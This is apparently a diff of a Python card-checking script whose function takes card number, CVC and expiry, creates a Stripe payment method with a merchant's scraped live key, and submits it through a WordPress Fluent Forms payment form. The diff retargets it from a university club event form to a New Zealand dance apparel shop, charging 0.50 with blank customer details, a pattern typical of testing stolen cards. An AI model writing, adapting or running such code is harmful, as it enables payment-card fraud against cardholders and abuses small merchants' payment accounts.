@@ -28,32 +28,29 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fmarketingclub-unisg.com&time_on_page=67532&key=pk_live_51JhFP2DsiWC9w1X6eNh9YIjDIalgt2GZksUL5X7tBCzb83GIuI9ynHUDVyTbr3wqm8qHMLoR1a3MPjdzBLt4LVLg007QpZkhQH'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fwww.hardcoredance.co.nz&time_on_page=40872&key=pk_live_51OWZLeElHMgTV6WwZ83MXcRw4QbarZY7UBFuy4UkG8n3WEjDqAaiZ8x6hxkH3KF9f8qxRZfFoxjetAqWWaJLBPwK00llwRbrka'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'asp_transient_id': '9240979747b7c4ab64e6f9ddb366f8c0',
-	    '_gid': 'GA1.2.1186890321.1735937615',
-	    '_ga': 'GA1.1.297284431.1735937615',
-	    '__stripe_mid': '8d49cdf7-33f2-40c6-93c7-6404caaddda6c19505',
-	    '__stripe_sid': '322cf1ec-1053-468a-aade-6dd02a8e44776634c1',
-	    '_gali': 'fluentform_19',
-	    '_ga_R9LQEKW8FB': 'GS1.1.1735937615.1.1.1735937656.0.0.0',
+	    '_ga': 'GA1.1.319732123.1736005065',
+	    '_ga_2QNVT6M9NE': 'GS1.1.1736005065.1.0.1736005067.0.0.0',
+	    '__stripe_mid': '66aee31a-2d1a-423f-bd5e-a943bd8fee19af8a0b',
+	    '__stripe_sid': '679438b2-2267-435b-9b59-36c11933a3cf773ff2',
 	}
 	
 	headers = {
-	    'authority': 'marketingclub-unisg.com',
+	    'authority': 'www.hardcoredance.co.nz',
 	    'accept': '*/*',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'cache-control': 'no-cache',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'asp_transient_id=9240979747b7c4ab64e6f9ddb366f8c0; _gid=GA1.2.1186890321.1735937615; _ga=GA1.1.297284431.1735937615; __stripe_mid=8d49cdf7-33f2-40c6-93c7-6404caaddda6c19505; __stripe_sid=322cf1ec-1053-468a-aade-6dd02a8e44776634c1; _gali=fluentform_19; _ga_R9LQEKW8FB=GS1.1.1735937615.1.1.1735937656.0.0.0',
-	    'origin': 'https://marketingclub-unisg.com',
+	    # 'cookie': '_ga=GA1.1.319732123.1736005065; _ga_2QNVT6M9NE=GS1.1.1736005065.1.0.1736005067.0.0.0; __stripe_mid=66aee31a-2d1a-423f-bd5e-a943bd8fee19af8a0b; __stripe_sid=679438b2-2267-435b-9b59-36c11933a3cf773ff2',
+	    'origin': 'https://www.hardcoredance.co.nz',
 	    'pragma': 'no-cache',
-	    'referer': 'https://marketingclub-unisg.com/events/action-learning-in-retail-workshop/',
+	    'referer': 'https://www.hardcoredance.co.nz/hdc-apparel/',
 	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -65,17 +62,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1735937684974',
+	    't': '1736005106035',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=1053&_fluentform_19_fluentformnonce=ee402ad04b&_wp_http_referer=%2Fevents%2Faction-learning-in-retail-workshop%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser07%40gmail.com&description=BA&checkbox%5B%5D=No&dropdown=Pay%20now%20with%20card&payment_input=5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=154&_fluentform_12_fluentformnonce=f08db0d2c3&_wp_http_referer=%2Fhdc-apparel%2F&custom-payment-amount_1=0.50&names%5Bfirst_name%5D=&names%5Blast_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bzip%5D=&phone=&email=&payment_method=stripe&mega_crew_hoodie%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '19',
+	    'form_id': '12',
 	}
 	
 	r2 = requests.post(
-	    'https://marketingclub-unisg.com/wp-admin/admin-ajax.php',
+	    'https://www.hardcoredance.co.nz/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
